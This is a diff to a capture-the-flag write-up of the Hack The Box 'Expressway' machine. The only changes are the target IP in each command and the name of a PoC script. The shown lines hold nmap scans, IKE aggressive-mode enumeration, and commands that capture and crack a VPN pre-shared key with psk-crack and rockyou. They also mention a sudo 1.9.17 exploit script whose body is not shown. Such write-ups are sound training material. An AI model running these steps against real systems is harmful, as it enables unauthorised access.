@@ -26,11 +26,11 @@
 ## TCP scan (nmap)
 
 ```
-nmap -sVC 10.129.113.8
+nmap -sVC 10.10.11.87
 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 00:22 CEST
 
-Nmap scan report for 10.129.113.8
+Nmap scan report for 10.10.11.87
 Host is up (0.033s latency).
 
 Not shown: 999 closed tcp ports (reset)
@@ -48,11 +48,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ## UDP scan (nmap — top 100)
 
 ```
-nmap -sU --top-ports 100 10.129.113.8
+nmap -sU --top-ports 100 10.10.11.87
 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 00:23 CEST
 
-Nmap scan report for 10.129.113.8
+Nmap scan report for 10.10.11.87
 Host is up (0.15s latency).
 
 Not shown: 96 closed udp ports (port-unreach)
@@ -71,9 +71,9 @@ PORT     STATE         SERVICE
 ## IKE enumeration (ike-scan)
 
 ```
-ike-scan -M 10.129.113.8
+ike-scan -M 10.10.11.87
 
-10.129.113.8    Main Mode Handshake returned
+10.10.11.87    Main Mode Handshake returned
         HDR=(CKY-R=04ec1a9db3726275)
         SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
         VID=09002689dfd6b712 (XAUTH)
@@ -83,9 +83,9 @@ ike-scan -M 10.129.113.8
 Aggressive mode:
 
 ```
-ike-scan -M --aggressive 10.129.113.8
+ike-scan -M --aggressive 10.10.11.87
 
-10.129.113.8    Aggressive Mode Handshake returned
+10.10.11.87    Aggressive Mode Handshake returned
         HDR=(CKY-R=261e81de0f8d9a62)
         SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
         KeyExchange(128 bytes)
@@ -112,7 +112,7 @@ ike-scan -M --aggressive 10.129.113.8
 Example run (from notes):
 
 ```
-ike-scan -M --aggressive --id=ike@expressway.htb 10.129.113.8 --pskcrack=psk.txt
+ike-scan -M --aggressive --id=ike@expressway.htb 10.10.11.87 --pskcrack=psk.txt
 psk-crack -d /usr/share/wordlists/rockyou.txt psk.txt
 # result: key "freak<PASS>" matches SHA1 hash ...
 ```
@@ -165,7 +165,7 @@ Sudo version 1.9.17
 
 ---
 
-## PoC script (`exploit.sh`)
+## PoC script (`exp.sh`)
 
 ```bash
 #!/bin/bash
